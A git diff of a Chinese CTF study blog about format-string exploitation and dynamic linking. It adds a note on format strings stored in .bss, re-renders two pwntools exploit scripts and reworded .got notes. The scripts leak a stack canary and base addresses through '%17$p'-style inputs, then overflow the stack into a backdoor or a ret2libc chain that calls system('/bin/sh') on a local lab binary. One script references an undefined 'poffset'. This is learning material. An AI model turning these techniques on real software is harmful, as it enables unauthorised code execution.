@@ -155,6 +155,72 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2021/11/22/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/11/22/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-3/" class="post-title-link" itemprop="url">格式化字符串-3</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-11-22 19:15:49" itemprop="dateCreated datePublished" datetime="2021-11-22T19:15:49+08:00">2021-11-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-02-04 04:08:05" itemprop="dateModified" datetime="2022-02-04T04:08:05+08:00">2022-02-04</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="格式化字符串在bss段的处理（没写完）"><a href="#格式化字符串在bss段的处理（没写完）" class="headerlink" title="格式化字符串在bss段的处理（没写完）"></a>格式化字符串在bss段的处理（没写完）</h2><p>当格式化字符串不在栈上，而是在堆上或者 .bss 段上的时候，我们便无法直接往栈上写入我们想要读写的地址。但是我们也可以通过修改栈上的指针为我们想要读写的地址，进而在栈上得到我们想要读写的地址来完成类似的利用手法。</p>
+<p>我们知道格式化字符串参数 %n 会把其对应的参数作为指针解析，并往该指针所指向的地址写入已经打印出的字节数大小。同时由于函数调用的过程，只要我们此时所在的函数是作为被调用函数（存在其父函数），那么该函数的栈帧中就会保存有其父函数的 rbp 地址，同理这个 rbp 地址中同样保存了一个栈地址，这样我们就得到了一个天然的存在于栈上的链式指针结构，我们就可以利用这个结构来让我们想要读写的地址出现在栈上。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2021/11/21/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2-2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -178,10 +244,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2021-11-21 17:13:15 / 修改时间：18:09:19" itemprop="dateCreated datePublished" datetime="2021-11-21T17:13:15+08:00">2021-11-21</time>
+              <time title="创建时间：2021-11-21 17:13:15" itemprop="dateCreated datePublished" datetime="2021-11-21T17:13:15+08:00">2021-11-21</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-02-04 03:18:54" itemprop="dateModified" datetime="2022-02-04T03:18:54+08:00">2022-02-04</time>
+              </span>
 
           
 
@@ -221,11 +293,11 @@
 
 <p>我们计算出了偏移为 0x215c 个字节，只要我们每次将利用格式化字符串泄漏的那个程序地址 -0x215c 即可得到程序的基地址，同时我们又可以在IDA中找到后门函数使得偏移，这样就得到了每次程序运行时后门函数的真实地址。</p>
 <p>exp如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&quot;./ff&quot;)</span><br><span class="line">#gdb.attach(p,&quot;b *$rebase(0x13BB)&quot;)</span><br><span class="line">elf = ELF(&quot;./ff&quot;)</span><br><span class="line"></span><br><span class="line">#p.sendlineafter(&quot;name? &quot;,&#x27;%17$p%12$p&#x27;) # canary %17$p  program_addr %12$p</span><br><span class="line">p.recvuntil(&quot;0x&quot;)</span><br><span class="line">canary = int(p.recv(16),16)</span><br><span class="line">p.recvuntil(&quot;0x&quot;)</span><br><span class="line">pgm_addr = int(p.recv(12),16) - 0x215c</span><br><span class="line">print hex(canary)</span><br><span class="line">print hex(pgm_addr)</span><br><span class="line"></span><br><span class="line">sys_offset = 0x1228</span><br><span class="line">sys = pgm_addr + sys_offset</span><br><span class="line"></span><br><span class="line">payload = &quot;a&quot;*0x38 + p64(canary) + &quot;a&quot;*0x8 + p64(sys)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./ff&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b *$rebase(0x13BB)&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./ff&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.sendlineafter(&quot;name? &quot;,&#x27;%17$p%12$p&#x27;) # canary %17$p  program_addr %12$p</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">pgm_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">0x215c</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(canary)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(pgm_addr)</span><br><span class="line"></span><br><span class="line">sys_offset = <span class="number">0x1228</span></span><br><span class="line">sys = pgm_addr + sys_offset</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x38</span> + p64(canary) + <span class="string">&quot;a&quot;</span>*<span class="number">0x8</span> + p64(sys)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>假设这题没有后门函数，我们也可以利用类似的思想，通过泄漏栈上的libc函数的地址以及栈上的程序地址，从而得到gadget的真实地址，再ret2libc即可。</p>
 <p>exp如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line"></span><br><span class="line">p = process(&quot;./ff&quot;)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">elf = ELF(&quot;./ff&quot;)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;name? &quot;,&#x27;%17$p%23$p%12$p&#x27;) # canary:%17$p __libc_start_main:%23$p program_addr:%12$p</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;0x&quot;)</span><br><span class="line">canary = int(p.recv(16),16)</span><br><span class="line">p.recvuntil(&quot;0x&quot;)</span><br><span class="line">lsm = int(p.recv(12),16)-240</span><br><span class="line">p.recvuntil(&quot;0x&quot;)</span><br><span class="line">pgm_addr = int(p.recv(12),16) - 0x215c</span><br><span class="line">print hex(canary)</span><br><span class="line">print hex(lsm)</span><br><span class="line">print hex(pgm_addr)</span><br><span class="line"></span><br><span class="line">sys = lsm - libc.symbols[&#x27;__libc_start_main&#x27;] + libc.symbols[&#x27;system&#x27;]</span><br><span class="line">binsh = lsm - libc.symbols[&#x27;__libc_start_main&#x27;] + libc.search(&#x27;/bin/sh&#x27;).next()</span><br><span class="line"></span><br><span class="line">pop_rdi_offset = 0x14e3</span><br><span class="line">pop_rdi = pgm_addr + poffset</span><br><span class="line"></span><br><span class="line">payload = &quot;a&quot;*0x38 + p64(canary) + &quot;a&quot;*0x8 + p64(pop_rdi) + p64(binsh) + p64(sys)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./ff&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ff&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;name? &quot;</span>,<span class="string">&#x27;%17$p%23$p%12$p&#x27;</span>) <span class="comment"># canary:%17$p __libc_start_main:%23$p program_addr:%12$p</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">lsm = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">240</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">pgm_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">0x215c</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(canary)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(lsm)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(pgm_addr)</span><br><span class="line"></span><br><span class="line">sys = lsm - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>] + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = lsm - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>] + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">pop_rdi_offset = <span class="number">0x14e3</span></span><br><span class="line">pop_rdi = pgm_addr + poffset</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x38</span> + p64(canary) + <span class="string">&quot;a&quot;</span>*<span class="number">0x8</span> + p64(pop_rdi) + p64(binsh) + p64(sys)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 
       
@@ -536,10 +608,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2021-10-30 12:07:42 / 修改时间：13:36:48" itemprop="dateCreated datePublished" datetime="2021-10-30T12:07:42+08:00">2021-10-30</time>
+              <time title="创建时间：2021-10-30 12:07:42" itemprop="dateCreated datePublished" datetime="2021-10-30T12:07:42+08:00">2021-10-30</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-02-04 14:24:03" itemprop="dateModified" datetime="2022-02-04T14:24:03+08:00">2022-02-04</time>
+              </span>
 
           
 
@@ -561,8 +639,8 @@
 
 <p>所有动态链接库的可执行文件会在link_map中形成一个链表保存起来</p>
 <p>__dl_runtime_resolve就是用来解析某个函数在库函数中真实地址的函数</p>
-<p>.got（全局偏移量表）是代码段中的一个节，其保存了整个程序的虚拟内存空间中的全局变量的偏移</p>
-<p>.got.plt节保存函数偏移，其在数据段</p>
+<p>.got 是代码段中的一个节，其保存了整个程序的虚拟内存空间中的<strong>全局变量</strong>的偏移（保存全局变量偏移表）</p>
+<p>.got.plt节保存<strong>全局函数</strong>偏移，其在数据段</p>
 <h3 id="动态链接过程"><a href="#动态链接过程" class="headerlink" title="动态链接过程"></a>动态链接过程</h3><h5 id="在第一次调用某函数时："><a href="#在第一次调用某函数时：" class="headerlink" title="在第一次调用某函数时："></a>在第一次调用某函数时：</h5><p>首先执行call foo@plt时（foo是假设的函数），程序无法直接跳转到foo函数，因为foo函数首先在某个动态链接库中（这里假设在libc动态链接库中），其次程序也不知道foo函数在libc中的具体位置，此时plt发挥作用，plt是代码段中的一个节，每个被这个程序调用的动态链接库中的函数都会在.plt中创建一个表项，.plt中的每一个项都保存了一个被程序调用的在动态链接库中的函数，所以foo函数第一次被程序调用时就跳转到.plt表中对应的保存foo函数的项中，如下：</p>
 <img src="/2021/10/30/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E7%9B%B8%E5%85%B3/%E8%B0%83%E7%94%A8-1.png" class>
 
@@ -973,14 +1051,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">27</span>
+          <span class="site-state-item-count">28</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-count">18</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
